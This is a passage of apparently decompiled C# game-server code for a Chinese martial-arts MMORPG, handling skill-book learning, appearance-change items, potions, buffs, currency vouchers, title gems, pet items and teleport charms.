					if (!武功类.检查修炼条件(this, 3, 13))
					{
						return;
					}
					武功类.学习武功书(this, 3, 13);
					武功类.学习武功书(this, 3, 14);
					break;
				case 1000001231:
					if (!武功类.检查修炼条件(this, 3, 17))
					{
						return;
					}
					武功类.学习武功书(this, 3, 17);
					武功类.学习武功书(this, 3, 18);
					武功类.学习武功书(this, 3, 19);
					break;
				case 1000001320:
				case 1000001321:
				case 1000001322:
				case 1000001323:
				case 1000001324:
				case 1000001325:
				case 1000001326:
				case 1000001327:
				case 1000001328:
				case 1000001329:
				case 1000001330:
				case 1000001331:
				case 1000001332:
				case 1000001333:
				case 1000001337:
				case 1000001338:
					if (!武功类.检查修炼条件(this, 3, 16) || !武功类.检查修炼条件(this, 3, 17))
					{
						return;
					}
					武功类.学习武功书(this, 3, 16);
					武功类.学习武功书(this, 3, 17);
					break;
				case 1000001341:
					if (!武功类.检查修炼条件(this, 3, 23))
					{
						return;
					}
					武功类.学习武功书(this, 3, 23);
					武功类.学习武功书(this, 3, 24);
					break;
				case 1000001340:
					if (!武功类.检查修炼条件(this, 3, 21))
					{
						return;
					}
					武功类.学习武功书(this, 3, 21);
					武功类.学习武功书(this, 3, 22);
					break;
				case 1000001339:
					if (!武功类.检查修炼条件(this, 3, 21))
					{
						return;
					}
					武功类.学习武功书(this, 3, 21);
					武功类.学习武功书(this, 3, 22);
					武功类.学习武功书(this, 3, 23);
					break;
				case 1000001336:
					if (!武功类.检查修炼条件(this, 3, 22))
					{
						return;
					}
					武功类.学习武功书(this, 3, 22);
					武功类.学习武功书(this, 3, 23);
					break;
				case 1000001334:
					if (!武功类.检查修炼条件(this, 3, 19))
					{
						return;
					}
					武功类.学习武功书(this, 3, 19);
					break;
				case 1000001335:
					if (!武功类.检查修炼条件(this, 1, 19))
					{
						return;
					}
					武功类.学习武功书(this, 1, 19);
					break;
				}
				物品使用(1, num2, 1);
				base.Player_ExpErience -= value.FLD_NEED_FIGHTEXP;
				base.Player_Money -= value.FLD_NEED_MONEY;
				学习技能提示();
				更新武功和状态();
				更新金钱和负重();
				更新经验和历练();
				end_IL_0001:;
			}
			catch
			{
			}
		}

		public void 天云岳整容效果(int 物品id)
		{
			int value = 0;
			switch (new Random().Next(1, 5))
			{
			case 1:
				value = 2001;
				break;
			case 2:
				value = 2002;
				break;
			case 3:
				value = 2003;
				break;
			case 4:
				value = 2004;
				break;
			case 5:
				value = 2005;
				break;
			}
			byte[] array = Converter.hexStringToByte("AA5516007104300210000100000034E1143C000000000100D10755AA");
			Buffer.BlockCopy(BitConverter.GetBytes(物品id), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 24, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			New人物模版.脸型 = BitConverter.ToInt16(BitConverter.GetBytes(value), 0);
			初始化已装备物品();
			更新武功和状态();
			更新广播人物数据();
			更新人物数据(this);
			更新装备效果();
		}

		public void 天云岳美容效果(int 物品id)
		{
			int value = 0;
			switch (new Random().Next(1, 5))
			{
			case 1:
				value = 2001;
				break;
			case 2:
				value = 2002;
				break;
			case 3:
				value = 2003;
				break;
			case 4:
				value = 2004;
				break;
			case 5:
				value = 2005;
				break;
			}
			byte[] array = Converter.hexStringToByte("AA5516007104300210000100000033E1143C000000000100D30755AA");
			Buffer.BlockCopy(BitConverter.GetBytes(物品id), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 24, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			New人物模版.发型 = BitConverter.ToInt16(BitConverter.GetBytes(value), 0);
			初始化已装备物品();
			更新武功和状态();
			更新广播人物数据();
			更新人物数据(this);
			更新装备效果();
		}

		public void 吃药(byte[] 封包数据)
		{
			int num = 0;
			try
			{
				if (base.Player死亡 || (人物锁定 ? true : false))
				{
					return;
				}
				int num13 = 封包数据[10];
				int num24 = 封包数据[11];
				byte[] array = new byte[4];
				byte[] array13 = new byte[4];
				byte[] array15 = new byte[4];
				Buffer.BlockCopy(封包数据, 34, array15, 0, 2);
				Buffer.BlockCopy(封包数据, 14, array, 0, 4);
				Buffer.BlockCopy(封包数据, 22, array13, 0, 4);
				int num36 = BitConverter.ToInt32(array15, 0);
				int num49 = BitConverter.ToInt32(array, 0);
				BitConverter.ToInt32(array13, 0);
				if (num13 == 60)
				{
					if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num24].物品ID, 0) != num49 || ((BitConverter.ToInt32(人物灵兽.宠物装备栏[num24].物品ID, 0) == 0) ? true : false))
					{
						return;
					}
					goto IL_0438;
				}
				if (BitConverter.ToInt32(装备栏包裹[num24].物品ID, 0) != num49 || ((BitConverter.ToInt32(装备栏包裹[num24].物品ID, 0) == 0) ? true : false))
				{
					switch (num49)
					{
					default:
						return;
					case 900020034:
						num49 -= 20000;
						break;
					case 900020035:
						num49 -= 20000;
						break;
					case 999020058:
						num49 -= 20000;
						break;
					case 999020059:
						num49 -= 20000;
						break;
					case 999020060:
						num49 -= 20000;
						break;
					case 999020061:
						num49 -= 20000;
						break;
					case 999020062:
						num49 -= 20000;
						break;
					case 999020709:
						num49 -= 20000;
						break;
					case 1000020050:
						num49 -= 20000;
						break;
					case 1000020815:
						num49 -= 20000;
						break;
					case 1000020816:
						num49 -= 20000;
						break;
					case 1000020818:
						num49 -= 20000;
						break;
					case 1000020819:
						num49 -= 20000;
						break;
					case 1000020830:
						num49 -= 20000;
						break;
					case 1000020841:
						num49 -= 20000;
						break;
					case 1000020842:
						num49 -= 20000;
						break;
					case 1000020843:
						num49 -= 20000;
						break;
					case 1008020053:
						num49 -= 20000;
						break;
					case 1008020054:
						num49 -= 20000;
						break;
					case 1008020055:
						num49 -= 20000;
						break;
					case 1008020522:
						num49 -= 20000;
						break;
					case 1008020523:
						num49 -= 20000;
						break;
					case 1008020524:
						num49 -= 20000;
						break;
					case 1008020525:
						num49 -= 20000;
						break;
					case 1008020526:
						num49 -= 20000;
						break;
					case 1008020527:
						num49 -= 20000;
						break;
					case 1008020528:
						num49 -= 20000;
						break;
					case 1008020529:
						num49 -= 20000;
						break;
					case 1008020530:
						num49 -= 20000;
						break;
					case 1008020531:
						num49 -= 20000;
						break;
					case 1008020532:
						num49 -= 20000;
						break;
					case 1008020533:
						num49 -= 20000;
						break;
					case 1008020534:
						num49 -= 20000;
						break;
					case 1008020535:
						num49 -= 20000;
						break;
					}
				}
				goto IL_0438;
				IL_0438:
				if (!World.Itme.TryGetValue(num49, out var value) || ((BitConverter.ToInt32(装备栏包裹[num24].物品ID, 0) == 0) ? true : false))
				{
					return;
				}
				num = num49;
				switch (num49)
				{
				case 1700101:
					物品使用(num13, num24, 0);
					return;
				case 1700102:
					物品使用(num13, num24, 0);
					return;
				case 1700103:
					物品使用(num13, num24, 0);
					return;
				case 9000085:
				case 9000120:
				case 9000121:
				case 9000165:
				case 9000166:
				case 9000317:
				case 9001207:
				case 9001211:
				case 9001215:
				case 9009076:
				case 9009150:
				case 9009217:
				case 9009309:
				case 9009839:
				case 9009941:
				case 9009943:
				case 9009965:
				case 9009966:
				case 9009970:
				{
					if (GetAddState(num49))
					{
						新吃药提示();
						return;
					}
					int num88 = 7200000;
					switch (num49)
					{
					case 9000085:
					case 9000317:
						num88 = 5400000;
						break;
					case 9000166:
					case 9001215:
					case 9009217:
					case 9009941:
						num88 = 10800000;
						break;
					case 9009150:
					case 9009839:
					case 9009965:
					case 9009966:
						num88 = 3600000;
						break;
					}
					追加状态类 追加状态类103 = new 追加状态类(this, num88, num49, 1);
					追加状态列表.Add(追加状态类103.FLD_PID, 追加状态类103);
					状态效果(array, 1, num88);
					base.FLD_人物_追加_经验百分比 += 0.2;
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 9000088:
				case 9000104:
				case 9000105:
				case 9000144:
				case 9000145:
				case 9000168:
				case 9001214:
				case 9009077:
				case 9009092:
				case 9009151:
				case 9009788:
				case 9009789:
				case 9009790:
				case 9009820:
				case 9009964:
				{
					if (GetAddState(num49))
					{
						新吃药提示();
						return;
					}
					int num87 = 7200000;
					switch (num49)
					{
					case 9000088:
						num87 = 5400000;
						break;
					case 9000168:
					case 9001214:
						num87 = 10800000;
						break;
					case 9009151:
						num87 = 3600000;
						break;
					case 9009964:
						num87 = 3600000;
						break;
					}
					追加状态类 追加状态类100 = new 追加状态类(this, num87, num49, 1);
					追加状态列表.Add(追加状态类100.FLD_PID, 追加状态类100);
					状态效果(array, 1, num87);
					base.FLD_人物_追加_历练百分比 += 0.5;
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 700000002:
					if (World.是否开启银票兑换元宝 == 1)
					{
						物品使用(num13, num24, 1);
						CheckTreasureGems();
						CheckGemPointsData(World.银票兑换元宝, 1, "银票");
						SaveGemData();
						RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "银票兑换元宝", 1, World.银票兑换元宝);
					}
					return;
				case 999000163:
				{
					if (GetAddState(num49))
					{
						追加状态列表[num49].时间结束事件();
					}
					物品使用(num13, num24, 1);
					int num37 = 3600000;
					int num39 = num49;
					int num41 = num39;
					if (num41 == 999000163)
					{
						num37 *= 8;
					}
					追加状态类 追加状态类50 = new 追加状态类(this, num37, num49, 1);
					追加状态列表.Add(追加状态类50.FLD_PID, 追加状态类50);
					状态效果(array, 1, num37);
					int num42 = num49;
					int num43 = num42;
					if (num43 == 999000163)
					{
						移动(158f, -312f, 15f, 25202);
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				}
				case 900000401:
					if (称号积分 > int.Parse(World.至高无上称号奖励[0]))
					{
						系统提示("宝石数量已经达到最高阶段", 9, "系统提示");
						return;
					}
					base.称号追加HP = 0;
					base.称号追加防御 = 0;
					base.称号追加攻击 = 0;
					称号积分++;
					系统提示("当前宝石数量" + 称号积分 + "个, 请到网站查询获取宝石称号阶段", 9, "系统提示");
					if (称号积分 >= int.Parse(World.至高无上称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.至高无上称号奖励[1]);
						base.称号追加防御 = int.Parse(World.至高无上称号奖励[2]);
						base.称号追加HP = int.Parse(World.至高无上称号奖励[3]);
						base.FLD_荣誉ID = 601;
						获取称号类型(1008001567, 1);
					}
					else if (称号积分 >= int.Parse(World.举世无双称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.举世无双称号奖励[1]);
						base.称号追加防御 = int.Parse(World.举世无双称号奖励[2]);
						base.称号追加HP = int.Parse(World.举世无双称号奖励[3]);
						base.FLD_荣誉ID = 602;
						获取称号类型(1008001567, 0);
						获取称号类型(1008001568, 1);
					}
					else if (称号积分 >= int.Parse(World.雄霸天下称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.雄霸天下称号奖励[1]);
						base.称号追加防御 = int.Parse(World.雄霸天下称号奖励[2]);
						base.称号追加HP = int.Parse(World.雄霸天下称号奖励[3]);
						base.FLD_荣誉ID = 603;
						获取称号类型(1008001568, 0);
						获取称号类型(1008001569, 1);
					}
					else if (称号积分 >= int.Parse(World.孤胆英雄称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.孤胆英雄称号奖励[1]);
						base.称号追加防御 = int.Parse(World.孤胆英雄称号奖励[2]);
						base.称号追加HP = int.Parse(World.孤胆英雄称号奖励[3]);
						base.FLD_荣誉ID = 604;
						获取称号类型(1008001569, 0);
						获取称号类型(1008001570, 1);
					}
					else if (称号积分 >= int.Parse(World.英雄豪杰称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.英雄豪杰称号奖励[1]);
						base.称号追加防御 = int.Parse(World.英雄豪杰称号奖励[2]);
						base.称号追加HP = int.Parse(World.英雄豪杰称号奖励[3]);
						base.FLD_荣誉ID = 605;
						获取称号类型(1008001570, 0);
						获取称号类型(1008001571, 1);
					}
					更新人物数据(this);
					更新广播人物数据();
					更新武功和状态();
					SavePlayerData();
					物品使用(num13, num24, 1);
					break;
				case 900000399:
					if (称号积分 > int.Parse(World.至高无上称号奖励[0]))
					{
						系统提示("宝石数量已经达到最高阶段", 9, "系统提示");
						break;
					}
					base.称号追加HP = 0;
					base.称号追加防御 = 0;
					base.称号追加攻击 = 0;
					称号积分 += 3000;
					系统提示("当前宝石数量" + 称号积分 + "个,请到网站查询获取宝石称号阶段", 9, "系统提示");
					if (称号积分 >= int.Parse(World.至高无上称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.至高无上称号奖励[1]);
						base.称号追加防御 = int.Parse(World.至高无上称号奖励[2]);
						base.称号追加HP = int.Parse(World.至高无上称号奖励[3]);
						base.FLD_荣誉ID = 601;
						获取称号类型(1008001567, 1);
					}
					else if (称号积分 >= int.Parse(World.举世无双称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.举世无双称号奖励[1]);
						base.称号追加防御 = int.Parse(World.举世无双称号奖励[2]);
						base.称号追加HP = int.Parse(World.举世无双称号奖励[3]);
						base.FLD_荣誉ID = 602;
						获取称号类型(1008001567, 0);
						获取称号类型(1008001568, 1);
					}
					else if (称号积分 >= int.Parse(World.雄霸天下称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.雄霸天下称号奖励[1]);
						base.称号追加防御 = int.Parse(World.雄霸天下称号奖励[2]);
						base.称号追加HP = int.Parse(World.雄霸天下称号奖励[3]);
						base.FLD_荣誉ID = 603;
						获取称号类型(1008001568, 0);
						获取称号类型(1008001569, 1);
					}
					else if (称号积分 >= int.Parse(World.孤胆英雄称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.孤胆英雄称号奖励[1]);
						base.称号追加防御 = int.Parse(World.孤胆英雄称号奖励[2]);
						base.称号追加HP = int.Parse(World.孤胆英雄称号奖励[3]);
						base.FLD_荣誉ID = 604;
						获取称号类型(1008001569, 0);
						获取称号类型(1008001570, 1);
					}
					else if (称号积分 >= int.Parse(World.英雄豪杰称号奖励[0]))
					{
						base.称号追加攻击 = int.Parse(World.英雄豪杰称号奖励[1]);
						base.称号追加防御 = int.Parse(World.英雄豪杰称号奖励[2]);
						base.称号追加HP = int.Parse(World.英雄豪杰称号奖励[3]);
						base.FLD_荣誉ID = 605;
						获取称号类型(1008001570, 0);
						获取称号类型(1008001571, 1);
					}
					更新人物数据(this);
					更新广播人物数据();
					更新武功和状态();
					SavePlayerData();
					物品使用(num13, num24, 1);
					break;
				case 999000234:
					if (!PrivateState(999000234))
					{
						int num32 = 860000000;
						追加状态类 追加状态类55 = new 追加状态类(this, num32, num24, 1);
						追加状态列表.Add(追加状态类55.FLD_PID, 追加状态类55);
						状态效果(array, 1, num32);
						更改名字样式(BitConverter.GetBytes(2), BitConverter.GetBytes(29), 255);
						更新人物数据(this);
						更新武功和状态();
						物品使用(num13, num24, 1);
						SavePlayerData();
						RxjhClass.药品记录(base.Userid, base.UserName, num24, value.ItmeNAME, 1);
					}
					break;
				case 900000619:
					if (GetAddState(900000619))
					{
						新吃药提示();
					}
					else if (DateTime.Now.Hour >= int.Parse(World.安全模式时间[0]) && DateTime.Now.Hour <= int.Parse(World.安全模式时间[1]))
					{
						int num55 = World.安全挂机时间 * 60000;
						追加状态类 追加状态类78 = new 追加状态类(this, num55, num49, 1);
						追加状态列表.Add(追加状态类78.FLD_PID, 追加状态类78);
						状态效果(array, 1, num55);
						安全模式 = 1;
						物品使用(num13, num24, 1);
						系统提示("恭喜你, 安全模式开启成功, 请放心挂机。");
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					else
					{
						系统提示("安全模式开放时间为每天" + int.Parse(World.安全模式时间[0]) + "点到" + int.Parse(World.安全模式时间[1]) + "点!", 9, "[系统]");
					}
					return;
				case 999000058:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(50, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 999000059:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(60, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 999000060:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(70, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 999000061:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(80, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 999000062:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(90, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 999000063:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(100, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 999000064:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(300, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 999000065:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(500, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 999000066:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(1000, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 999000709:
					CheckTreasureGems();
					物品使用(num13, num24, 1);
					检察元宝数据(100, 1, "元宝卷");
					SaveGemData();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 1000000030:
				{
					if (GetAddState(1000000030))
					{
						新吃药提示();
						return;
					}
					追加状态类 追加状态类14 = new 追加状态类(this, 3600000, num49, 1);
					追加状态列表.Add(追加状态类14.FLD_PID, 追加状态类14);
					状态效果(array, 1, 3600000);
					base.FLD_人物_追加_历练百分比 += 1.0;
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				}
				case 1000000050:
					try
					{
						if (组队id == 0 || (int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (!World.Teams.TryGetValue(组队id, out var value35))
						{
							break;
						}
						if (!value35.红包)
						{
							value35.红包 = true;
							物品使用(num13, num24, 1);
							value35.红包时间 = 7200000;
							foreach (Players value28 in value35.组队列表.Values)
							{
								if (value28.追加状态列表 != null)
								{
									if (value28.GetAddState(1000000050))
									{
										value28.追加状态列表[1000000050].时间结束事件();
									}
									追加状态类 追加状态类18 = new 追加状态类(value28, value35.红包时间, 1000000050, 0);
									value28.追加状态列表.Add(追加状态类18.FLD_PID, 追加状态类18);
									value28.状态效果(BitConverter.GetBytes(1000000050), 1, value35.红包时间);
								}
							}
							RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
						}
						else
						{
							系统提示("当前队伍已有红包经验/金钱/历练加成, 不能重复使用。", 50, "系统提示");
						}
					}
					catch (Exception ex2)
					{
						MainForm.WriteLine(1, "组队红包发送出错" + ex2.Message);
					}
					break;
				case 1000000262:
					if (World.是否开启王龙 == 0)
					{
						break;
					}
					if (World.王龙的金币 >= 1000000000)
					{
						Random random4 = new Random(DateTime.Now.Millisecond);
						int num58 = random4.Next(0, 100);
						if (num58 >= 0 && num58 < 33)
						{
							物品使用(num13, num24, 1);
							CheckTreasureGems();
							int 元宝 = random4.Next(0, (int)((double)World.王龙的金币 * 1E-05));
							检察元宝数据(元宝, 1, "王龙");
							SaveGemData();
							World.系统滚动公告("玩家[" + base.UserName + "]开启王龙的金条获得" + 元宝 + "元宝");
						}
						else if (num58 >= 33 && num58 < 96)
						{
							byte[] array6 = Converter.hexStringToByte("AA5522000000121614000000000000000000000000000000000000000000000000000000A65455AA");
							Buffer.BlockCopy(BitConverter.GetBytes(num24), 0, array6, 11, 1);
							Buffer.BlockCopy(BitConverter.GetBytes(1000000262), 0, array6, 14, 4);
							开箱(array6);
						}
						else
						{
							物品使用(num13, num24, 1);
							int num59 = random4.Next(0, (int)World.王龙的金币);
							base.Player_Money += num59;
							更新金钱和负重();
							World.系统滚动公告("玩家[" + base.UserName + "]开启王龙的金条获得" + num59 + "金币");
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						int num61 = new Random(DateTime.Now.Millisecond).Next(0, (int)World.王龙的金币);
						base.Player_Money += num61;
						更新金钱和负重();
						World.系统滚动公告("玩家[" + base.UserName + "]开启王龙的金条获得" + num61 + "金币");
					}
					World.王龙的金币 = 5000000L;
					break;
				case 1000000033:
					if (base.帮派名字.Length == 0 || ((base.帮派人物等级 != 6) ? true : false))
					{
						系统提示("只有帮主才可以使用", 50, "");
					}
					else if (base.帮派等级 < 6)
					{
						物品使用(num13, num24, 1);
						DBA.ExeSqlCommand($"UPDATE TBL_XWWL_Guild SET 门派武勋=门派武勋+5000, 名声=名声+3, 胜=胜+1 WHERE ID='{base.帮派Id}'");
						更新门派等级(base.UserName);
						系统提示("帮派胜利点数+1, 帮派武勋+5000, 帮派声望+3", 50, "");
					}
					else
					{
						系统提示("当前帮派无需升级", 50, "");
					}
					break;
				case 1000000081:
				case 1000000192:
				case 1000000193:
				case 1000000194:
				case 1000000195:
					if (BitConverter.ToInt32(装备栏已穿装备[14].物品ID, 0) != 0 && (World.Itme.ContainsKey(BitConverter.ToInt32(装备栏已穿装备[14].物品ID, 0)) ? true : false))
					{
						if (World.Itme[BitConverter.ToInt32(装备栏已穿装备[14].物品ID, 0)].FLD_RESIDE2 != 15 || ((人物灵兽 != null) ? true : false))
						{
							return;
						}
						读出灵兽数据(BitConverter.ToInt64(装备栏已穿装备[14].物品全局ID, 0), this);
						if (人物灵兽 == null)
						{
							return;
						}
						switch (num49)
						{
						case 1000000081:
							人物灵兽.FLD_ZCD = 600;
							物品使用(num13, num24, 1);
							break;
						case 1000000192:
							人物灵兽.FLD_HP = 人物灵兽.FLD_HP_MAX;
							物品使用(num13, num24, 1);
							break;
						case 1000000193:
							if (人物灵兽.FLD_JOB_LEVEL == 1)
							{
								人物灵兽.FLD_HP = 人物灵兽.FLD_HP_MAX;
								物品使用(num13, num24, 1);
							}
							else
							{
								系统提示("此道具只适完成一次转职的灵兽。");
							}
							break;
						case 1000000194:
							if (人物灵兽.FLD_JOB_LEVEL == 2)
							{
								人物灵兽.FLD_HP = 人物灵兽.FLD_HP_MAX;
								物品使用(num13, num24, 1);
							}
							else
							{
								系统提示("此道具只适完成二次转职的灵兽。");
							}
							break;
						case 1000000195:
							if (人物灵兽.FLD_JOB_LEVEL == 3)
							{
								人物灵兽.FLD_HP = 人物灵兽.FLD_HP_MAX;
								物品使用(num13, num24, 1);
							}
							else
							{
								系统提示("此道具只适完成三次转职的灵兽。");
							}
							break;
						}
						清空灵兽状态();
					}
					else
					{
						系统提示("请先把宠物召唤符装备在道具栏中。");
					}
					return;
				case 1000000082:
					if (人物灵兽 != null)
					{
						物品使用(num13, num24, 1);
						人物灵兽.FLD_MAGIC1 = 0;
						人物灵兽.FLD_MAGIC2 = 0;
						人物灵兽.FLD_MAGIC3 = 0;
						人物灵兽.FLD_MAGIC4 = 0;
						人物灵兽.FLD_MAGIC5 = 0;
						更新灵兽武功和状态();
					}
					else
					{
						系统提示("请先召唤出灵兽才能使用。");
					}
					return;
				case 1000000098:
					if (GetAddState(1000000099))
					{
						追加状态列表[1000000099].时间结束事件();
						物品使用(num13, num24, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1000000099:
					if (!GetAddState(1000000099))
					{
						追加状态类 追加状态类7 = new 追加状态类(this, 28800000, num49, 1);
						追加状态列表.Add(追加状态类7.FLD_PID, 追加状态类7);
						状态效果(array, 1, 28800000);
						物品使用(num13, num24, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1000000101:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000833))
					{
						加血(140);
					}
					else if (追加状态列表.ContainsKey(1000000834))
					{
						加血(105);
					}
					else if (异常状态.ContainsKey(20))
					{
						加血(56);
					}
					else
					{
						加血(70);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000102:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000833))
					{
						加血(320);
					}
					else if (追加状态列表.ContainsKey(1000000834))
					{
						加血(240);
					}
					else if (异常状态.ContainsKey(20))
					{
						加血(128);
					}
					else
					{
						加血(160);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1008000812:
				{
					物品类 物品类4 = 得到行囊背包物品(1008002684);
					if (物品类4 != null)
					{
						系统提示("你行囊格有杂货行囊！");
						return;
					}
					物品使用(num13, num24, 1);
					增加行囊物品带属性(1008002684, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					初始化行囊包裹();
					初始化装备篮包裹();
					break;
				}
				case 1008000131:
				{
					物品类 物品类5 = 得到行囊背包物品(1600001);
					if (物品类5 != null)
					{
						系统提示("你行囊格有侠客行囊，购买行囊续时牌！");
						return;
					}
					物品使用(num13, num24, 1);
					增加行囊物品带属性(1600001, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30);
					初始化行囊包裹();
					初始化装备篮包裹();
					break;
				}
				case 1008001508:
				{
					物品类 物品类3 = 得到行囊背包物品(1008001507);
					if (物品类3 != null)
					{
						系统提示("你行囊格有披风行囊！");
						return;
					}
					物品使用(num13, num24, 1);
					增加行囊物品带属性(1008001507, 2, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					初始化行囊包裹();
					初始化装备篮包裹();
					break;
				}
				case 1000000103:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000833))
					{
						加血(600);
					}
					else if (追加状态列表.ContainsKey(1000000834))
					{
						加血(450);
					}
					else if (异常状态.ContainsKey(20))
					{
						加血(240);
					}
					else
					{
						加血(300);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000104:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000834))
					{
						加魔(105);
					}
					else if (异常状态.ContainsKey(20))
					{
						加魔(56);
					}
					else
					{
						加魔(70);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000105:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000834))
					{
						加魔(240);
					}
					else if (异常状态.ContainsKey(20))
					{
						加魔(128);
					}
					else
					{
						加魔(160);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000106:
					if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
					{
						return;
					}
					吃药时间 = DateTime.Now;
					if (追加状态列表.ContainsKey(1000000834))
					{
						加魔(450);
					}
					else if (异常状态.ContainsKey(20))
					{
						加魔(240);
					}
					else
					{
						加魔(300);
					}
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000110:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array7 = World.地图锁定.Split(';');
					if (array7.Length >= 1)
					{
						int num64 = 0;
						while (num64 < array7.Length)
						{
							if (int.Parse(array7[num64]) == base.人物坐标_地图)
							{
								return;
							}
							int num80 = num64 + 1;
							num64 = num80;
						}
					}
					坐标Class value15 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value15);
					if (World.老泫勃派开关 == 1)
					{
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						移动(485f, 2188f, 15f, 101);
					}
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000111:
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						break;
					}
					string[] array2 = World.地图锁定.Split(';');
					if (array2.Length >= 1)
					{
						int num34 = 0;
						while (num34 < array2.Length)
						{
							if (int.Parse(array2[num34]) == base.人物坐标_地图)
							{
								return;
							}
							int num79 = num34 + 1;
							num34 = num79;
						}
					}
					坐标Class value4 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
